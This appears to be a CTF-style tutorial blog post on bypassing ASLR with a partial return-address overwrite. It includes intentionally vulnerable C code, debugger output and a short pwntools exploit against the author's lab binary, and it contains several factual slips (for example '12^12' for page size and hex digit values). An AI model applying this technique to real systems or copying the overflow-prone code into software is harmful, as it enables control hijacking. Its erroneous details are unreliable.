---
title: "Buffer Overflow to control hijacking in ASLR enabled binary"
description: "This article demonstrates how to exploit buffer overflows in ASLR-enabled binaries by understanding memory pages and offsets, enabling control hijacking even with modern defenses."
---
<img width="3464" height="1949" alt="Picsart_25-10-24_15-33-13-893" src="https://github.com/user-attachments/assets/77b7c3f3-3294-4b06-ab44-423ee93618b4" />


Buffer overflow - A vulnerability which does not scares the programmers anymore because for them ASLR is thier saviour but is it really a saviour or it just pretend to be? 

In this article we will see how we can exploit the buffer overflow vulnerbability in a ASLR enabled binary by crafting our exploit logically.

### Table of Content 

1. [Memory Pages](#memory)
2. [Buffer overflow to Control HIjacking & ASLR](#buffer-overflow-to-control-hijacking-and-ASLR)
3. [Exploitation Technique](#exploitation-technique)
4. [Conclusion](#conclusion)

### Memory Pages

A block of memory in the computer system is referred to as a Page and the whole memory is splited into pages that can be used by the programs running on the system. 

On modern computer systems the default size of a single page is `4KB` or `4096 Bytes` so each page starts at a address which is a multiple of `4096` or `12^12` for example :

```
0x00000000
0x00001000
0x00002000
0x00003000
```

Now if we convert `4096` to hexdecimal then the value becomes `0x1000` and if you take this and multiple with any number you will get the valid start address that is aligned to `4096 Byte` boundary. 

For example :

```
0x1000 * 20 = 0x14000
0x1000 * 200 = 0xc8000
0x1000 * 2220 = 0x8ac000
```

Here we can see whatever number we take and multiply with `0x1000` the resulting hexadecimal has `000` at the end but what's the role of this three `0's` here? 

For understanding the actual role we need to know some details about the hexadecimal format.

In Hexadecimal each hex value is represented using `4 bits` (4 bits are also called one nibble) so a single hex value can be anything between `0-f` (0-9 then 10 as a , 20 as b and likewise) because if you take 4 bits and put it is as power of 2 (a single binary digit can be either 1 or 0) you will get 16 which means with 4 bits we can represent 16 different values. 

Now coming back to our question we see `0x1000` the number of `0's`  are three each `0` is uses 4 bit so `3*4=12` we have `12` bits in total to represent numbers now putting this `12` as power of `2` then we get `4096` as result which simply shows us we can use those 3 hex digits to address a whole page of memory. 

The formula is simple :  To get page of `size x` you need `n` (`2^n = x`) to be zero in our case to get a page of `size 4096` we need `n=12` (`2^12=4096`) to be zero.

Example of a real 4KB Page :

```
Start Address -> 0xab457394cf65b000
End Address -> 0xab457394cf65bfff


  Legal Address		12 Bits		Decimal 

0xab457394cf65b001 |     0x001    |        1
0xab457394cf65b0f2 |     0x0f2	  |       242
0xab457394cf65bca2 |     0xca2	  |      3234
```

If we are on a `32-bit` machine the address size would be `4 bytes` and for `64-bit` the address size would be `8 bytes` but on both machines the complete address is formed by combining the `start of page address` and `offset in that page` this might sound little confusing but an example will clearify this better -

When the machine is `64 bit` the address look like this `0x0000000000000000` (this is valid too) we already understood that memory is splited into pages and we need `12 bits` or `3 hex value`  to cover all addresses of a single page so for `0x0000000000000000` the last three hex digits are used to cover the addresses of the page defined by the remaining `13 bits` - `0x0000000000000` which can be anything like `0x1affbbad223ca` which is a page and the remaining 3 bit of it will cover the addresses of this page.

Visual Representation of this Example - 

<img width="770" height="580" alt="791a1c3b02b8abcc86bb31a5082f9953" src="https://github.com/user-attachments/assets/a08629d0-ce9a-4c77-823a-e879a53c2144" />

Figure 1.1 Visual Representation of stack.

### Buffer overflow to Control Hijacking and ASLR 

When we define any variable in our program a block of memory get allocated to it on the memory section known as `stack`. As we know a single program can have any number of variables so when we define more than one variable memory on the stack get allocated to them in the order they are defined.

Example :

```c
#include <stdio.h>


int variable3;
int variable2;
int variable1;

int main(){
	return 0;
}
```

How this variables look on the stack :

<img width="327" height="508" alt="Untitled Diagram drawio(1)" src="https://github.com/user-attachments/assets/a8d0aee6-2270-4f1b-9630-dce5b0636940" />


Figure 1.2 : Stack View

When we define the variable we mention its type with it like `int`,`char`,`float` etc which has fixed  sizes according to the architecture of the computer and this is not the problem the real problem is with the inputs that a program ask for from a user. 

Let's say an `char` variable is defined on a 64 bit machine then it's size would be 1 bytes (8 bits) and the program uses a function like read  to ask for a input from the user which gets stored in that variable and the size of the var provided to the read function is more than the actual size then what will happen ? It will simply write the memory block on the stack that comes after the memory block of that variable and this is known as `buffer overflow`.

Now if you look at the `Figure 1.2` then you can see at the top of the stack there is something called `return address` which is the location of our focus  as this is the address where the program control will return after completion of a function.

Now take an example :

```
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>


int do_not_call_this(){
        printf("\nWhy did you called me :/ ?");
        return 0;
}

int main(int argc,char **argv){
                printf("address of do_not_call_this : %p",do_not_call_this);
                char name_buffer[15];
                fflush(stdout);
                printf("\nEnter your name: ");
                read(0,name_buffer,30);
                printf("\nWelcome to 0x4B1T, %s",name_buffer);
}

```

Compile the program with :

```
gcc chall.c -o chall -fno-stack-protector -fno-pie -no-pi
```

Running the program :

<img width="889" height="178" alt="c7dd76167c2d17135ce3771aa2d93838" src="https://github.com/user-attachments/assets/07fcb34a-a09c-40e7-a6cf-45e4a94e2e78" />

Figure 1.3 : Program Screenshot

So the program is very simple it just print the address of a function named `do_not_call_this` and then define an array of size `15 Bytes` named `name_buffer` just after that it ask for input which get stored in that array but somthing is off in the read function yah you got it the size is mismatched. 

View of the stack when the read function is getting executed : 

<img width="634" height="509" alt="Untitled Diagram drawio(5)" src="https://github.com/user-attachments/assets/96cb7311-d567-48f1-9da6-7b105ee4724c" />

Figure 1.4 : Stack View during a function execution.

Just think what if we change the address stored as return address on the stack with the address of the `do_not_call_this` function ? The control will be handed over to this function instead of the instruction `printf("\nWelcome to 0x4B1T, %s",name_buffer);` and this is what we call `Control Hijacking`.

This looks easy but what if the function `do_not_call_this` does not have a fixed address means address changes with each run how we will hijack the control ? Keep Aside the technique and just remeber this the what we call `ASLR` - Address Space Layout Randomization. When ASLR is enabled in a binary it will run on different addresses with each run which make it diffcult to hijack the control but not impossible.

### Exploitation Technique

For the demonstration purpose we will use this code :

```
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>


int flag(){
        char flag[20];
        FILE *fp = fopen("./flag.txt","r");
        fgets(flag,sizeof(flag),fp);
        printf("Here is your flag : ");
        printf("%s",flag);
        fclose(fp);
        return 0;
}

int challenge(){
        char buffer[15];
        printf("What's your name? : ");
        fflush(stdout);
        read(0,buffer,30);
        printf("0x4B1T Welcomes - %s",buffer);
        return 0;
}

int main(int argc,char **argv[]){
        printf("Address of main : %p \n",main);
        printf("Address of challenge : %p \n",challenge);
        printf("Address of flag : %p \n",flag);
        challenge();
        return 0;
}
```

We will compile it with ASLR and stack protection for which we can do :

```
gcc -fno-stack-protector chall.c -o chall
```

After Compiling the binary we can check the security with :

```
checksec --file=./chall
```

Output :

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   44 Symbols        No    0               3               ./chall
```

We can see it says `PIE` is `enabled`  which means it is `Position Independent Exectable` simply saying it does not depends on fixed address and can be run on ant address making it a ASLR enabled binary.

We can verify this by running the binary - 

<img width="924" height="832" alt="4bcdde3cf27edd54d564929ed4e0b0ae" src="https://github.com/user-attachments/assets/0fe9dd81-d291-460d-8abf-a051170ab9e3" />

Figure 1.5 : Challenge binary Screenshot 

We ran the binary 4 times and with each run it gave us different address. 

Here is one other method to look at the address space of the binary and check wether it is changing with each run or not :

```
./chall & 
```

This will run the process in background and will give a `Process Identifier` or `PID`

```
cat /proc/<PID>/maps
```

<img width="1741" height="651" alt="2f4d51a0a1bf5ac37d0e14581bf1dffd" src="https://github.com/user-attachments/assets/350eb235-3cc4-41b1-918d-806ba6ec1218" />

Figure 1.6 : Memory map

Running both the commands again :

<img width="1697" height="649" alt="84ce60fed6056e95d54e221e5d5cb719" src="https://github.com/user-attachments/assets/b16dbc50-e97a-4516-a9fd-e7f63c1a08c2" />

Figure 1.7 : Memory map 2

Here you can see both the output shows different addresses for the stack but you can see the last three number in both the output are 000 and I hope you know reason behind it.

Now if we go back to the `Figure 1.5` you should find a interesting thing here - Every time we are running the program it gives address for `main` , `challenge` and `flag` function which are having same last digits which will looks like constants but if our binary is using ASLR why this is happening ? The answer is simple `offset` - A Page can start from any address but the positon where the function inside the page will be located will stay the same similarly the offset between two function will also not change which is why we can hijack the control even when the ASLR is enabled. 

Finding the offset for writing the correct RIP :

```
pwndbg> disas challenge
Dump of assembler code for function challenge:
   0x000000000000120e <+0>:     push   rbp
   0x000000000000120f <+1>:     mov    rbp,rsp
   0x0000000000001212 <+4>:     sub    rsp,0x10
   0x0000000000001216 <+8>:     lea    rax,[rip+0xe0c]        # 0x2029
   0x000000000000121d <+15>:    mov    rdi,rax
   0x0000000000001220 <+18>:    mov    eax,0x0
   0x0000000000001225 <+23>:    call   0x1040 <printf@plt>
   0x000000000000122a <+28>:    mov    rax,QWORD PTR [rip+0x2e0f]        # 0x4040 <stdout@GLIBC_2.2.5>
   0x0000000000001231 <+35>:    mov    rdi,rax
   0x0000000000001234 <+38>:    call   0x1070 <fflush@plt>
   0x0000000000001239 <+43>:    lea    rax,[rbp-0xf]
   0x000000000000123d <+47>:    mov    edx,0x1e
   0x0000000000001242 <+52>:    mov    rsi,rax
   0x0000000000001245 <+55>:    mov    edi,0x0
   0x000000000000124a <+60>:    call   0x1050 <read@plt>
   0x000000000000124f <+65>:    lea    rax,[rbp-0xf]
   0x0000000000001253 <+69>:    mov    rsi,rax
   0x0000000000001256 <+72>:    lea    rax,[rip+0xde1]        # 0x203e
   0x000000000000125d <+79>:    mov    rdi,rax
   0x0000000000001260 <+82>:    mov    eax,0x0
   0x0000000000001265 <+87>:    call   0x1040 <printf@plt>
   0x000000000000126a <+92>:    mov    eax,0x0
   0x000000000000126f <+97>:    leave
   0x0000000000001270 <+98>:    ret
End of assembler dump.
pwndbg> break *challenge+60
Breakpoint 1 at 0x124a
pwndbg> run
```

<img width="1919" height="642" alt="Screenshot_2025-10-24_13-20-42" src="https://github.com/user-attachments/assets/18399960-b24d-462f-abff-a6bd2c4f1ad6" />


Figure 1.8 : Address where input will be stiored 

This is the address on the stack where our input will be stored.

```
pwndbg> info frame
Stack level 0, frame at 0x7fffffffdd80:
 rip = 0x55555555524f in challenge; saved rip = 0x5555555552e4
 called by frame at 0x7fffffffdda0
 Arglist at 0x7fffffffdd70, args: 
 Locals at 0x7fffffffdd70, Previous frame's sp is 0x7fffffffdd80
 Saved registers:
  rbp at 0x7fffffffdd70, rip at 0x7fffffffdd78
```

We can see the RIP is stored at `0x7fffffffdd78`.

After getting both the address we can simply do the following to identify the gap between our buffer and the retrun address -

```
python3 -c "print(0x7fffffffdd78-0x7fffffffdd61)"
```

Output :

```
23
```

So we need to write 23 Bytes to reach the RIP. 

Now we can easily write an exploit for this binary to hijack the control :

```
#!/bin/python3


from pwn import *

p = process("./chall")
#gdb.attach(p)
p.send(b'\x00'*23+b'\x89'+b'\x41')

print(p.recvall())
```

One important thing to note there - In python we can't write nibble we can write bytes only which means we can't write `189` we can write something like `0189` or `3189` so you need to choose a random value for the 4th hexdigit and run the binary multiple times until it matches the actual value.

![7874bcb494061b68ae1e30be068ec0d0.png](:/2b288e7f7b35451791e6a4f0401b7571)
Figure 1.8 : Flag

We got the flag!!

In our example all three  functions - `main` and `flag` were in the same page and the 4th hex digit did not caused any big issue while control hijacking but what if the 5th hex digit of the target function is different then the 5th hex digit of the challenge then the brute force would so much longer time beacuse then the value will be between 0-255. This happens when the program is so large that it uses multiple pages and function we are exploiting and the function where we want the RIP to point are in different pages - If more the pages is under 16 pages away 4th hex digit will be changed if 16-256 pages away  5th and 4th hex digit will change.

### Conclusion 

ASLR raises the bar but isn’t a silver bullet — by understanding pages and relative offsets you can still hijack control in many practical cases (especially when targets live in the same mapping). In short: ASLR helps, but layered defenses (canaries, NX/DEP, RELRO, code hygiene) are needed to make exploitation truly hard.


